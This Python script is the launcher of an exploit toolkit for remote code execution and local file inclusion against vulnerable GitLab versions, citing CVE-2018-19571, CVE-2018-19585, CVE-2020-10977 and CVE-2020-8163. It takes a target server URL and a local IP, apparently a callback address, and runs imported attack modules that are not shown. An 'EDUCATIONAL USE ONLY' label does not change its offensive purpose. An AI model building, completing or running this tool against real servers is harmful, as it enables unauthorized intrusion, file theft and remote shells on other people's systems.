#!/usr/bin/env python3
"""
GitLab RCE+LFI toolkit — version <= 11.4.7, 12.4.0-12.8.1
CVEs: CVE-2018-19571, CVE-2018-19585, CVE-2020-10977, CVE-2020-8163
EDUCATIONAL USE ONLY
"""

import sys

from src.client import GitlabClient
from src.runner import Runner


def main() -> None:
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <http://gitlab:port> <local-ip>")
        sys.exit(2)
    client = GitlabClient(url=sys.argv[1], local_ip=sys.argv[2])
    Runner(client).run()


if __name__ == "__main__":
    main()
